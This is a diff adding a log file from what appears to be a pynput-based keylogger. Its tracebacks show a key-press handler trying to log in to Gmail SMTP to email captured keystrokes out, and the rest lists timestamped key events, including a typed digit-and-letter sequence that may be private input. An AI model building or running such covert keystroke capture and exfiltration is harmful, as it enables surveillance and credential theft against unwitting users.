+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 642, in auth
+    raise SMTPAuthenticationError(code, resp)
+smtplib.SMTPAuthenticationError: (535, b'5.7.8 Username and Password not accepted. Learn more at\n5.7.8  https://support.google.com/mail/?p=BadCredentials l31sm97508399pgm.63 - gsmtp')
+2019-07-27 11:36:52,476: Infomation: 's'
+2019-07-27 11:37:01,550: Unhandled exception in listener callback
+Traceback (most recent call last):
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 157, in inner
+    return f(self, *args, **kwargs)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\keyboard\_win32.py", line 240, in _process
+    self.on_press(key)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 78, in inner
+    if f(*args) is False:
+  File "Log_file_to_determine_position.py", line 53, in on_press
+    server.login(sender_email, password)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 730, in login
+    raise last_exception
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 721, in login
+    initial_response_ok=initial_response_ok)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 642, in auth
+    raise SMTPAuthenticationError(code, resp)
+smtplib.SMTPAuthenticationError: (535, b'5.7.8 Username and Password not accepted. Learn more at\n5.7.8  https://support.google.com/mail/?p=BadCredentials 201sm65253249pfz.24 - gsmtp')
+2019-07-27 11:38:17,818: Infomation: 's'
+2019-07-27 11:38:54,961: Infomation: Key.down
+2019-07-27 11:38:55,394: Infomation: Key.down
+2019-07-27 11:38:55,418: Infomation: Key.down
+2019-07-27 11:38:55,442: Infomation: Key.down
+2019-07-27 11:38:55,465: Infomation: Key.down
+2019-07-27 11:38:55,489: Infomation: Key.down
+2019-07-27 11:38:55,513: Infomation: Key.down
+2019-07-27 11:38:55,537: Infomation: Key.down
+2019-07-27 11:39:02,961: Infomation: Key.down
+2019-07-27 11:39:03,393: Infomation: Key.down
+2019-07-27 11:39:03,417: Infomation: Key.down
+2019-07-27 11:39:03,441: Infomation: Key.down
+2019-07-27 11:39:04,541: Infomation: Key.up
+2019-07-27 11:39:04,973: Infomation: Key.up
+2019-07-27 11:39:04,996: Infomation: Key.up
+2019-07-27 11:39:05,020: Infomation: Key.up
+2019-07-27 11:39:05,428: Infomation: Key.down
+2019-07-27 11:39:08,084: Infomation: Key.down
+2019-07-27 11:39:08,413: Infomation: Key.down
+2019-07-27 11:39:09,186: Infomation: Key.down
+2019-07-27 11:39:09,568: Infomation: Key.down
+2019-07-27 11:39:09,843: Infomation: Key.down
+2019-07-27 11:39:10,296: Infomation: Key.down
+2019-07-27 11:39:36,629: Infomation: Key.down
+2019-07-27 11:39:38,737: Infomation: Key.up
+2019-07-27 11:39:47,818: Infomation: Key.up
+2019-07-27 11:39:48,630: Infomation: Key.up
+2019-07-27 11:39:50,219: Infomation: 'e'
+2019-07-27 11:39:52,607: Infomation: 's'
+2019-07-27 11:40:39,277: Infomation: Key.enter
+2019-07-27 11:41:46,397: Infomation: Key.down
+2019-07-27 11:41:46,830: Infomation: Key.down
+2019-07-27 11:41:46,854: Infomation: Key.down
+2019-07-27 11:41:46,878: Infomation: Key.down
+2019-07-27 11:41:46,901: Infomation: Key.down
+2019-07-27 11:41:46,926: Infomation: Key.down
+2019-07-27 11:41:46,949: Infomation: Key.down
+2019-07-27 11:41:46,973: Infomation: Key.down
+2019-07-27 11:41:46,998: Infomation: Key.down
+2019-07-27 11:41:47,021: Infomation: Key.down
+2019-07-27 11:41:47,045: Infomation: Key.down
+2019-07-27 11:41:47,388: Infomation: Key.down
+2019-07-27 11:42:09,001: Infomation: Key.enter
+2019-07-27 11:42:11,128: Infomation: Key.ctrl_l
+2019-07-27 11:42:11,289: Infomation: 's'
+2019-07-27 11:42:57,021: Infomation: 's'
+2019-07-27 11:44:02,943: Infomation: Key.down
+2019-07-27 11:44:03,377: Infomation: Key.down
+2019-07-27 11:44:03,401: Infomation: Key.down
+2019-07-27 11:44:03,427: Infomation: Key.down
+2019-07-27 11:44:03,449: Infomation: Key.down
+2019-07-27 11:44:03,473: Infomation: Key.down
+2019-07-27 11:44:03,497: Infomation: Key.down
+2019-07-27 11:44:03,521: Infomation: Key.down
+2019-07-27 11:44:03,545: Infomation: Key.down
+2019-07-27 11:44:03,570: Infomation: Key.down
+2019-07-27 11:44:03,593: Infomation: Key.down
+2019-07-27 11:44:03,616: Infomation: Key.down
+2019-07-27 11:44:03,640: Infomation: Key.down
+2019-07-27 11:44:03,664: Infomation: Key.down
+2019-07-27 11:44:03,688: Infomation: Key.down
+2019-07-27 11:44:03,712: Infomation: Key.down
+2019-07-27 11:44:03,736: Infomation: Key.down
+2019-07-27 11:44:03,760: Infomation: Key.down
+2019-07-27 11:44:03,784: Infomation: Key.down
+2019-07-27 11:44:03,808: Infomation: Key.down
+2019-07-27 11:44:03,832: Infomation: Key.down
+2019-07-27 11:44:03,856: Infomation: Key.down
+2019-07-27 11:44:03,880: Infomation: Key.down
+2019-07-27 11:44:03,904: Infomation: Key.down
+2019-07-27 11:44:03,928: Infomation: Key.down
+2019-07-27 11:44:03,952: Infomation: Key.down
+2019-07-27 11:44:03,976: Infomation: Key.down
+2019-07-27 11:44:04,000: Infomation: Key.down
+2019-07-27 11:44:04,024: Infomation: Key.down
+2019-07-27 11:44:04,047: Infomation: Key.down
+2019-07-27 11:44:04,072: Infomation: Key.down
+2019-07-27 11:44:04,095: Infomation: Key.down
+2019-07-27 11:44:04,121: Infomation: Key.down
+2019-07-27 11:44:04,144: Infomation: Key.down
+2019-07-27 11:44:04,167: Infomation: Key.down
+2019-07-27 11:44:04,192: Infomation: Key.down
+2019-07-27 11:44:04,215: Infomation: Key.down
+2019-07-27 11:44:04,239: Infomation: Key.down
+2019-07-27 11:44:04,263: Infomation: Key.down
+2019-07-27 11:44:04,288: Infomation: Key.down
+2019-07-27 11:44:04,311: Infomation: Key.down
+2019-07-27 11:44:04,335: Infomation: Key.down
+2019-07-27 11:44:04,359: Infomation: Key.down
+2019-07-27 11:44:04,382: Infomation: Key.down
+2019-07-27 11:44:04,406: Infomation: Key.down
+2019-07-27 11:44:04,430: Infomation: Key.down
+2019-07-27 11:44:04,455: Infomation: Key.down
+2019-07-27 11:44:04,478: Infomation: Key.down
+2019-07-27 11:44:04,797: Infomation: Key.up
+2019-07-27 11:44:05,550: Infomation: Key.up
+2019-07-27 11:44:05,984: Infomation: Key.up
+2019-07-27 11:44:06,008: Infomation: Key.up
+2019-07-27 11:44:06,031: Infomation: Key.up
+2019-07-27 11:44:06,056: Infomation: Key.up
+2019-07-27 11:44:06,079: Infomation: Key.up
+2019-07-27 11:44:06,105: Infomation: Key.up
+2019-07-27 11:44:06,127: Infomation: Key.up
+2019-07-27 11:44:06,151: Infomation: Key.up
+2019-07-27 11:44:06,175: Infomation: Key.up
+2019-07-27 11:44:06,199: Infomation: Key.up
+2019-07-27 11:44:06,224: Infomation: Key.up
+2019-07-27 11:44:06,247: Infomation: Key.up
+2019-07-27 11:44:06,271: Infomation: Key.up
+2019-07-27 11:44:06,295: Infomation: Key.up
+2019-07-27 11:44:06,319: Infomation: Key.up
+2019-07-27 11:44:06,343: Infomation: Key.up
+2019-07-27 11:44:06,367: Infomation: Key.up
+2019-07-27 11:44:06,390: Infomation: Key.up
+2019-07-27 11:44:06,414: Infomation: Key.up
+2019-07-27 11:44:06,438: Infomation: Key.up
+2019-07-27 11:44:06,462: Infomation: Key.up
+2019-07-27 11:44:06,612: Infomation: Key.down
+2019-07-27 11:44:07,046: Infomation: Key.down
+2019-07-27 11:44:07,071: Infomation: Key.down
+2019-07-27 11:44:07,094: Infomation: Key.down
+2019-07-27 11:44:07,118: Infomation: Key.down
+2019-07-27 11:44:07,142: Infomation: Key.down
+2019-07-27 11:44:07,165: Infomation: Key.down
+2019-07-27 11:44:07,189: Infomation: Key.down
+2019-07-27 11:44:07,214: Infomation: Key.down
+2019-07-27 11:44:07,238: Infomation: Key.down
+2019-07-27 11:44:07,261: Infomation: Key.down
+2019-07-27 11:44:07,286: Infomation: Key.down
+2019-07-27 11:44:07,309: Infomation: Key.down
+2019-07-27 11:44:07,333: Infomation: Key.down
+2019-07-27 11:44:07,357: Infomation: Key.down
+2019-07-27 11:44:07,380: Infomation: Key.down
+2019-07-27 11:44:07,405: Infomation: Key.down
+2019-07-27 11:44:07,429: Infomation: Key.down
+2019-07-27 11:44:07,454: Infomation: Key.down
+2019-07-27 11:44:07,477: Infomation: Key.down
+2019-07-27 11:44:07,502: Infomation: Key.down
+2019-07-27 11:44:07,525: Infomation: Key.down
+2019-07-27 11:44:07,549: Infomation: Key.down
+2019-07-27 11:44:07,573: Infomation: Key.down
+2019-07-27 11:44:07,596: Infomation: Key.down
+2019-07-27 11:44:07,620: Infomation: Key.down
+2019-07-27 11:44:07,643: Infomation: Key.down
+2019-07-27 11:44:07,668: Infomation: Key.down
+2019-07-27 11:44:07,691: Infomation: Key.down
+2019-07-27 11:44:07,715: Infomation: Key.down
+2019-07-27 11:44:07,740: Infomation: Key.down
+2019-07-27 11:44:07,764: Infomation: Key.down
+2019-07-27 11:44:07,787: Infomation: Key.down
+2019-07-27 11:44:07,811: Infomation: Key.down
+2019-07-27 11:44:07,836: Infomation: Key.down
+2019-07-27 11:44:07,859: Infomation: Key.down
+2019-07-27 11:44:07,883: Infomation: Key.down
+2019-07-27 11:44:07,907: Infomation: Key.down
+2019-07-27 11:44:07,931: Infomation: Key.down
+2019-07-27 11:44:07,956: Infomation: Key.down
+2019-07-27 11:44:07,979: Infomation: Key.down
+2019-07-27 11:44:08,003: Infomation: Key.down
+2019-07-27 11:44:08,027: Infomation: Key.down
+2019-07-27 11:44:08,051: Infomation: Key.down
+2019-07-27 11:44:08,075: Infomation: Key.down
+2019-07-27 11:44:08,098: Infomation: Key.down
+2019-07-27 11:44:08,123: Infomation: Key.down
+2019-07-27 11:44:08,146: Infomation: Key.down
+2019-07-27 11:44:08,170: Infomation: Key.down
+2019-07-27 11:44:08,194: Infomation: Key.down
+2019-07-27 11:44:08,218: Infomation: Key.down
+2019-07-27 11:44:08,242: Infomation: Key.down
+2019-07-27 11:44:08,267: Infomation: Key.down
+2019-07-27 11:44:08,291: Infomation: Key.down
+2019-07-27 11:44:08,314: Infomation: Key.down
+2019-07-27 11:44:08,338: Infomation: Key.down
+2019-07-27 11:44:08,362: Infomation: Key.down
+2019-07-27 11:44:08,387: Infomation: Key.down
+2019-07-27 11:44:08,410: Infomation: Key.down
+2019-07-27 11:44:08,434: Infomation: Key.down
+2019-07-27 11:44:08,458: Infomation: Key.down
+2019-07-27 11:44:08,482: Infomation: Key.down
+2019-07-27 11:44:08,506: Infomation: Key.down
+2019-07-27 11:44:08,529: Infomation: Key.down
+2019-07-27 11:44:08,553: Infomation: Key.down
+2019-07-27 11:44:08,577: Infomation: Key.down
+2019-07-27 11:44:08,602: Infomation: Key.down
+2019-07-27 11:44:08,625: Infomation: Key.down
+2019-07-27 11:44:08,649: Infomation: Key.down
+2019-07-27 11:44:08,674: Infomation: Key.down
+2019-07-27 11:44:08,697: Infomation: Key.down
+2019-07-27 11:44:08,721: Infomation: Key.down
+2019-07-27 11:44:08,745: Infomation: Key.down
+2019-07-27 11:44:08,770: Infomation: Key.down
+2019-07-27 11:44:08,793: Infomation: Key.down
+2019-07-27 11:44:08,818: Infomation: Key.down
+2019-07-27 11:44:08,842: Infomation: Key.down
+2019-07-27 11:44:08,865: Infomation: Key.down
+2019-07-27 11:44:08,889: Infomation: Key.down
+2019-07-27 11:44:08,913: Infomation: Key.down
+2019-07-27 11:44:08,938: Infomation: Key.down
+2019-07-27 11:44:08,962: Infomation: Key.down
+2019-07-27 11:44:08,985: Infomation: Key.down
+2019-07-27 11:44:09,009: Infomation: Key.down
+2019-07-27 11:44:09,032: Infomation: Key.down
+2019-07-27 11:44:09,056: Infomation: Key.down
+2019-07-27 11:44:09,318: Infomation: Key.down
+2019-07-27 11:44:09,752: Infomation: Key.down
+2019-07-27 11:44:09,775: Infomation: Key.down
+2019-07-27 11:44:09,798: Infomation: Key.down
+2019-07-27 11:44:09,823: Infomation: Key.down
+2019-07-27 11:44:09,846: Infomation: Key.down
+2019-07-27 11:44:10,350: Infomation: Key.down
+2019-07-27 11:44:10,784: Infomation: Key.down
+2019-07-27 11:44:10,808: Infomation: Key.down
+2019-07-27 11:44:10,831: Infomation: Key.down
+2019-07-27 11:44:10,855: Infomation: Key.down
+2019-07-27 11:44:10,879: Infomation: Key.down
+2019-07-27 11:44:10,904: Infomation: Key.down
+2019-07-27 11:44:10,927: Infomation: Key.down
+2019-07-27 11:44:10,951: Infomation: Key.down
+2019-07-27 11:44:10,975: Infomation: Key.down
+2019-07-27 11:44:10,999: Infomation: Key.down
+2019-07-27 11:44:11,023: Infomation: Key.down
+2019-07-27 11:44:11,047: Infomation: Key.down
+2019-07-27 11:44:11,071: Infomation: Key.down
+2019-07-27 11:44:11,094: Infomation: Key.down
+2019-07-27 11:44:11,119: Infomation: Key.down
+2019-07-27 11:44:11,143: Infomation: Key.down
+2019-07-27 11:44:11,167: Infomation: Key.down
+2019-07-27 11:44:11,191: Infomation: Key.down
+2019-07-27 11:44:11,214: Infomation: Key.down
+2019-07-27 11:44:11,239: Infomation: Key.down
+2019-07-27 11:44:11,262: Infomation: Key.down
+2019-07-27 11:44:11,287: Infomation: Key.down
+2019-07-27 11:44:11,310: Infomation: Key.down
+2019-07-27 11:44:11,336: Infomation: Key.down
+2019-07-27 11:44:11,360: Infomation: Key.down
+2019-07-27 11:44:11,383: Infomation: Key.down
+2019-07-27 11:44:11,688: Infomation: Key.up
+2019-07-27 11:44:12,121: Infomation: Key.up
+2019-07-27 11:44:12,145: Infomation: Key.up
+2019-07-27 11:44:12,169: Infomation: Key.up
+2019-07-27 11:44:12,193: Infomation: Key.up
+2019-07-27 11:44:12,216: Infomation: Key.up
+2019-07-27 11:44:12,240: Infomation: Key.up
+2019-07-27 11:44:12,624: Infomation: Key.up
+2019-07-27 11:44:13,936: Infomation: Key.up
+2019-07-27 11:44:14,156: Infomation: Key.up
+2019-07-27 11:44:14,422: Infomation: Key.up
+2019-07-27 11:44:14,666: Infomation: Key.up
+2019-07-27 11:44:27,665: Infomation: Key.down
+2019-07-27 11:44:27,910: Infomation: Key.down
+2019-07-27 11:44:28,131: Infomation: Key.down
+2019-07-27 11:44:28,526: Infomation: Key.down
+2019-07-27 11:44:29,009: Infomation: Key.down
+2019-07-27 11:44:51,964: Infomation: Key.down
+2019-07-27 11:44:52,222: Infomation: Key.down
+2019-07-27 11:44:52,422: Infomation: Key.down
+2019-07-27 11:44:53,017: Infomation: Key.down
+2019-07-27 11:45:11,270: Infomation: Key.down
+2019-07-27 11:45:11,454: Infomation: Key.down
+2019-07-27 11:45:11,642: Infomation: Key.down
+2019-07-27 11:45:13,671: Infomation: Key.down
+2019-07-27 11:45:14,109: Infomation: Key.up
+2019-07-27 11:45:14,525: Infomation: Key.down
+2019-07-27 11:45:33,929: Infomation: Key.down
+2019-07-27 11:45:34,363: Infomation: Key.down
+2019-07-27 11:45:34,387: Infomation: Key.down
+2019-07-27 11:45:34,410: Infomation: Key.down
+2019-07-27 11:45:34,434: Infomation: Key.down
+2019-07-27 11:45:34,458: Infomation: Key.down
+2019-07-27 11:45:34,482: Infomation: Key.down
+2019-07-27 11:45:34,506: Infomation: Key.down
+2019-07-27 11:45:34,529: Infomation: Key.down
+2019-07-27 11:45:34,554: Infomation: Key.down
+2019-07-27 11:45:34,577: Infomation: Key.down
+2019-07-27 11:45:34,601: Infomation: Key.down
+2019-07-27 11:45:34,626: Infomation: Key.down
+2019-07-27 11:45:35,530: Infomation: Key.down
+2019-07-27 11:45:35,964: Infomation: Key.down
+2019-07-27 11:45:35,989: Infomation: Key.down
+2019-07-27 11:45:39,293: Infomation: Key.up
+2019-07-27 11:45:58,160: Infomation: Key.up
+2019-07-27 11:45:58,690: Infomation: Key.up
+2019-07-27 11:45:58,938: Infomation: Key.up
+2019-07-27 11:46:03,364: Infomation: Key.down
+2019-07-27 11:46:03,765: Infomation: Key.down
+2019-07-27 11:46:04,033: Infomation: Key.down
+2019-07-27 11:46:04,466: Infomation: Key.down
+2019-07-27 11:46:04,491: Infomation: Key.down
+2019-07-27 11:46:04,514: Infomation: Key.down
+2019-07-27 11:46:04,538: Infomation: Key.down
+2019-07-27 11:46:04,562: Infomation: Key.down
+2019-07-27 11:46:04,586: Infomation: Key.down
+2019-07-27 11:46:04,609: Infomation: Key.down
+2019-07-27 11:46:04,633: Infomation: Key.down
+2019-07-27 11:46:04,658: Infomation: Key.down
+2019-07-27 11:46:04,681: Infomation: Key.down
+2019-07-27 11:46:07,494: Infomation: Key.down
+2019-07-27 11:46:07,927: Infomation: Key.down
+2019-07-27 11:46:07,951: Infomation: Key.down
+2019-07-27 11:46:07,976: Infomation: Key.down
+2019-07-27 11:46:07,999: Infomation: Key.down
+2019-07-27 11:46:08,024: Infomation: Key.down
+2019-07-27 11:46:08,047: Infomation: Key.down
+2019-07-27 11:46:08,072: Infomation: Key.down
+2019-07-27 11:46:08,096: Infomation: Key.down
+2019-07-27 11:46:08,119: Infomation: Key.down
+2019-07-27 11:46:08,143: Infomation: Key.down
+2019-07-27 11:46:11,655: Infomation: Key.down
+2019-07-27 11:46:12,007: Infomation: Key.down
+2019-07-27 11:46:12,664: Infomation: Key.down
+2019-07-27 11:46:13,097: Infomation: Key.down
+2019-07-27 11:46:13,121: Infomation: Key.down
+2019-07-27 11:46:13,487: Infomation: Key.down
+2019-07-27 11:46:14,005: Infomation: Key.down
+2019-07-27 11:46:14,439: Infomation: Key.down
+2019-07-27 11:46:14,462: Infomation: Key.down
+2019-07-27 11:46:14,487: Infomation: Key.down
+2019-07-27 11:46:14,511: Infomation: Key.down
+2019-07-27 11:46:14,535: Infomation: Key.down
+2019-07-27 11:46:15,023: Infomation: Key.down
+2019-07-27 11:46:15,455: Infomation: Key.down
+2019-07-27 11:46:15,479: Infomation: Key.down
+2019-07-27 11:46:15,502: Infomation: Key.down
+2019-07-27 11:46:15,526: Infomation: Key.down
+2019-07-27 11:46:15,551: Infomation: Key.down
+2019-07-27 11:46:15,575: Infomation: Key.down
+2019-07-27 11:46:15,598: Infomation: Key.down
+2019-07-27 11:46:15,623: Infomation: Key.down
+2019-07-27 11:46:15,646: Infomation: Key.down
+2019-07-27 11:46:15,670: Infomation: Key.down
+2019-07-27 11:46:16,203: Infomation: Key.up
+2019-07-27 11:46:16,814: Infomation: Key.down
+2019-07-27 11:46:17,247: Infomation: Key.down
+2019-07-27 11:46:17,271: Infomation: Key.down
+2019-07-27 11:46:17,294: Infomation: Key.down
+2019-07-27 11:46:17,318: Infomation: Key.down
+2019-07-27 11:46:17,343: Infomation: Key.down
+2019-07-27 11:46:17,367: Infomation: Key.down
+2019-07-27 11:46:17,391: Infomation: Key.down
+2019-07-27 11:46:17,414: Infomation: Key.down
+2019-07-27 11:46:17,438: Infomation: Key.down
+2019-07-27 11:46:17,998: Infomation: Key.down
+2019-07-27 11:46:18,432: Infomation: Key.down
+2019-07-27 11:46:18,457: Infomation: Key.down
+2019-07-27 11:46:18,480: Infomation: Key.down
+2019-07-27 11:46:18,504: Infomation: Key.down
+2019-07-27 11:46:18,528: Infomation: Key.down
+2019-07-27 11:46:18,552: Infomation: Key.down
+2019-07-27 11:46:18,575: Infomation: Key.down
+2019-07-27 11:46:18,599: Infomation: Key.down
+2019-07-27 11:46:18,623: Infomation: Key.down
+2019-07-27 11:46:18,647: Infomation: Key.down
+2019-07-27 11:46:19,301: Infomation: Key.up
+2019-07-27 11:46:19,772: Infomation: Key.up
+2019-07-27 11:46:20,206: Infomation: Key.up
+2019-07-27 11:46:20,230: Infomation: Key.up
+2019-07-27 11:46:20,255: Infomation: Key.up
+2019-07-27 11:46:20,278: Infomation: Key.up
+2019-07-27 11:46:20,302: Infomation: Key.up
+2019-07-27 11:46:20,325: Infomation: Key.up
+2019-07-27 11:46:20,350: Infomation: Key.up
+2019-07-27 11:46:20,375: Infomation: Key.up
+2019-07-27 11:46:20,398: Infomation: Key.up
+2019-07-27 11:46:20,422: Infomation: Key.up
+2019-07-27 11:46:20,446: Infomation: Key.up
+2019-07-27 11:46:20,469: Infomation: Key.up
+2019-07-27 11:46:20,493: Infomation: Key.up
+2019-07-27 11:46:20,517: Infomation: Key.up
+2019-07-27 11:46:20,541: Infomation: Key.up
+2019-07-27 11:46:20,565: Infomation: Key.up
+2019-07-27 11:46:20,589: Infomation: Key.up
+2019-07-27 11:46:20,612: Infomation: Key.up
+2019-07-27 11:46:20,636: Infomation: Key.up
+2019-07-27 11:46:20,661: Infomation: Key.up
+2019-07-27 11:46:20,684: Infomation: Key.up
+2019-07-27 11:46:20,708: Infomation: Key.up
+2019-07-27 11:46:20,732: Infomation: Key.up
+2019-07-27 11:46:20,757: Infomation: Key.up
+2019-07-27 11:46:20,780: Infomation: Key.up
+2019-07-27 11:46:20,805: Infomation: Key.up
+2019-07-27 11:46:20,828: Infomation: Key.up
+2019-07-27 11:46:20,852: Infomation: Key.up
+2019-07-27 11:46:21,088: Infomation: Key.up
+2019-07-27 11:46:21,521: Infomation: Key.up
+2019-07-27 11:46:21,545: Infomation: Key.up
+2019-07-27 11:46:21,568: Infomation: Key.up
+2019-07-27 11:46:21,613: Infomation: Key.up
+2019-07-27 11:46:21,617: Infomation: Key.up
+2019-07-27 11:46:21,640: Infomation: Key.up
+2019-07-27 11:46:21,664: Infomation: Key.up
+2019-07-27 11:46:21,688: Infomation: Key.up
+2019-07-27 11:46:21,712: Infomation: Key.up
+2019-07-27 11:46:21,736: Infomation: Key.up
+2019-07-27 11:46:21,760: Infomation: Key.up
+2019-07-27 11:46:21,784: Infomation: Key.up
+2019-07-27 11:46:21,808: Infomation: Key.up
+2019-07-27 11:46:21,831: Infomation: Key.up
+2019-07-27 11:46:21,856: Infomation: Key.up
+2019-07-27 11:46:21,880: Infomation: Key.up
+2019-07-27 11:46:21,903: Infomation: Key.up
+2019-07-27 11:46:21,927: Infomation: Key.up
+2019-07-27 11:46:21,951: Infomation: Key.up
+2019-07-27 11:46:21,975: Infomation: Key.up
+2019-07-27 11:46:21,999: Infomation: Key.up
+2019-07-27 11:46:22,024: Infomation: Key.up
+2019-07-27 11:46:22,047: Infomation: Key.up
+2019-07-27 11:46:22,071: Infomation: Key.up
+2019-07-27 11:46:22,095: Infomation: Key.up
+2019-07-27 11:46:22,749: Infomation: Key.up
+2019-07-27 11:46:23,182: Infomation: Key.up
+2019-07-27 11:46:23,207: Infomation: Key.up
+2019-07-27 11:46:23,230: Infomation: Key.up
+2019-07-27 11:46:23,254: Infomation: Key.up
+2019-07-27 11:46:23,278: Infomation: Key.up
+2019-07-27 11:46:23,301: Infomation: Key.up
+2019-07-27 11:46:23,325: Infomation: Key.up
+2019-07-27 11:46:23,349: Infomation: Key.up
+2019-07-27 11:46:23,373: Infomation: Key.up
+2019-07-27 11:46:23,397: Infomation: Key.up
+2019-07-27 11:46:23,421: Infomation: Key.up
+2019-07-27 11:46:23,445: Infomation: Key.up
+2019-07-27 11:46:23,469: Infomation: Key.up
+2019-07-27 11:46:23,493: Infomation: Key.up
+2019-07-27 11:46:23,517: Infomation: Key.up
+2019-07-27 11:46:23,541: Infomation: Key.up
+2019-07-27 11:46:25,072: Infomation: Key.up
+2019-07-27 11:46:25,506: Infomation: Key.up
+2019-07-27 11:46:25,530: Infomation: Key.up
+2019-07-27 11:46:25,554: Infomation: Key.up
+2019-07-27 11:46:25,578: Infomation: Key.up
+2019-07-27 11:46:25,602: Infomation: Key.up
+2019-07-27 11:46:25,626: Infomation: Key.up
+2019-07-27 11:46:25,650: Infomation: Key.up
+2019-07-27 11:46:25,675: Infomation: Key.up
+2019-07-27 11:46:25,698: Infomation: Key.up
+2019-07-27 11:46:25,721: Infomation: Key.up
+2019-07-27 11:46:25,745: Infomation: Key.up
+2019-07-27 11:46:25,769: Infomation: Key.up
+2019-07-27 11:46:25,793: Infomation: Key.up
+2019-07-27 11:46:25,817: Infomation: Key.up
+2019-07-27 11:46:25,841: Infomation: Key.up
+2019-07-27 11:46:25,865: Infomation: Key.up
+2019-07-27 11:46:25,890: Infomation: Key.up
+2019-07-27 11:46:25,912: Infomation: Key.up
+2019-07-27 11:46:25,937: Infomation: Key.up
+2019-07-27 11:46:26,699: Infomation: Key.up
+2019-07-27 11:46:27,166: Infomation: Key.up
+2019-07-27 11:46:27,599: Infomation: Key.up
+2019-07-27 11:46:27,624: Infomation: Key.up
+2019-07-27 11:46:27,647: Infomation: Key.up
+2019-07-27 11:46:27,671: Infomation: Key.up
+2019-07-27 11:46:27,695: Infomation: Key.up
+2019-07-27 11:46:27,718: Infomation: Key.up
+2019-07-27 11:46:27,742: Infomation: Key.up
+2019-07-27 11:46:27,766: Infomation: Key.up
+2019-07-27 11:46:27,791: Infomation: Key.up
+2019-07-27 11:46:27,814: Infomation: Key.up
+2019-07-27 11:46:58,517: Infomation: '1'
+2019-07-27 11:46:58,986: Infomation: '7'
+2019-07-27 11:46:59,108: Infomation: '2'
+2019-07-27 11:46:59,806: Infomation: 'n'
+2019-07-27 11:46:59,953: Infomation: 'd'
+2019-07-27 11:47:00,440: Infomation: '4'
+2019-07-27 11:47:00,788: Infomation: '2'
+2019-07-27 11:47:01,158: Infomation: '0'
+2019-07-27 11:47:01,310: Infomation: '1'
+2019-07-27 11:47:01,450: Infomation: '0'
+2019-07-27 11:47:01,842: Infomation: Key.shift
+2019-07-27 11:47:02,051: Infomation: '2'
+2019-07-27 11:47:02,873: Infomation: 's'
+2019-07-27 11:50:02,040: Infomation: 's'
+2019-07-27 11:50:30,233: Infomation: Key.backspace
+2019-07-27 11:50:30,427: Infomation: Key.backspace
+2019-07-27 11:50:30,595: Infomation: Key.backspace
+2019-07-27 11:50:30,755: Infomation: Key.backspace
+2019-07-27 11:50:30,925: Infomation: Key.backspace
+2019-07-27 11:50:31,126: Infomation: Key.backspace
+2019-07-27 11:50:31,307: Infomation: Key.backspace
+2019-07-27 11:50:31,486: Infomation: Key.backspace
+2019-07-27 11:50:31,811: Infomation: Key.right
+2019-07-27 11:50:32,037: Infomation: Key.right
+2019-07-27 11:50:32,357: Infomation: Key.left
+2019-07-27 11:50:32,553: Infomation: Key.backspace
+2019-07-27 11:50:32,721: Infomation: Key.backspace
+2019-07-27 11:50:32,954: Infomation: Key.backspace
+2019-07-27 11:50:33,888: Infomation: Key.shift
+2019-07-27 11:50:34,046: Infomation: '9'
+2019-07-27 11:50:34,603: Infomation: Key.left
+2019-07-27 11:50:35,037: Infomation: Key.left
+2019-07-27 11:50:35,061: Infomation: Key.left
+2019-07-27 11:50:35,085: Infomation: Key.left
+2019-07-27 11:50:35,109: Infomation: Key.left
+2019-07-27 11:50:35,132: Infomation: Key.left
+2019-07-27 11:50:35,156: Infomation: Key.left
+2019-07-27 11:50:35,180: Infomation: Key.left
+2019-07-27 11:50:35,204: Infomation: Key.left
+2019-07-27 11:50:35,229: Infomation: Key.left
+2019-07-27 11:50:35,252: Infomation: Key.left
+2019-07-27 11:50:35,276: Infomation: Key.left
+2019-07-27 11:50:35,300: Infomation: Key.left
+2019-07-27 11:50:35,324: Infomation: Key.left
+2019-07-27 11:50:35,348: Infomation: Key.left
+2019-07-27 11:50:35,372: Infomation: Key.left
+2019-07-27 11:50:35,396: Infomation: Key.left
+2019-07-27 11:50:35,420: Infomation: Key.left
+2019-07-27 11:50:35,444: Infomation: Key.left
+2019-07-27 11:50:35,468: Infomation: Key.left
+2019-07-27 11:50:35,492: Infomation: Key.left
+2019-07-27 11:50:35,516: Infomation: Key.left
+2019-07-27 11:50:35,540: Infomation: Key.left
+2019-07-27 11:50:35,563: Infomation: Key.left
+2019-07-27 11:50:35,587: Infomation: Key.left
+2019-07-27 11:50:35,611: Infomation: Key.left
+2019-07-27 11:50:35,635: Infomation: Key.left
+2019-07-27 11:50:35,659: Infomation: Key.left
+2019-07-27 11:50:35,683: Infomation: Key.left
+2019-07-27 11:50:35,706: Infomation: Key.left
+2019-07-27 11:50:35,730: Infomation: Key.left
+2019-07-27 11:50:35,754: Infomation: Key.left
+2019-07-27 11:50:35,778: Infomation: Key.left
+2019-07-27 11:50:35,802: Infomation: Key.left
+2019-07-27 11:50:35,826: Infomation: Key.left
+2019-07-27 11:50:35,850: Infomation: Key.left
+2019-07-27 11:50:35,874: Infomation: Key.left
+2019-07-27 11:50:35,898: Infomation: Key.left
+2019-07-27 11:50:35,922: Infomation: Key.left
+2019-07-27 11:50:35,946: Infomation: Key.left
+2019-07-27 11:50:35,970: Infomation: Key.left
+2019-07-27 11:50:35,994: Infomation: Key.left
+2019-07-27 11:50:36,142: Infomation: Key.right
+2019-07-27 11:50:36,328: Infomation: Key.right
+2019-07-27 11:50:36,481: Infomation: Key.right
+2019-07-27 11:50:36,654: Infomation: Key.right
+2019-07-27 11:50:36,823: Infomation: Key.right
+2019-07-27 11:50:37,081: Infomation: Key.right
+2019-07-27 11:50:37,305: Infomation: Key.right
+2019-07-27 11:50:37,765: Infomation: Key.backspace
+2019-07-27 11:50:37,938: Infomation: Key.backspace
+2019-07-27 11:50:38,108: Infomation: Key.backspace
+2019-07-27 11:50:39,513: Infomation: Key.left
+2019-07-27 11:50:39,946: Infomation: Key.left
+2019-07-27 11:50:39,970: Infomation: Key.left
+2019-07-27 11:50:39,995: Infomation: Key.left
+2019-07-27 11:50:40,018: Infomation: Key.left
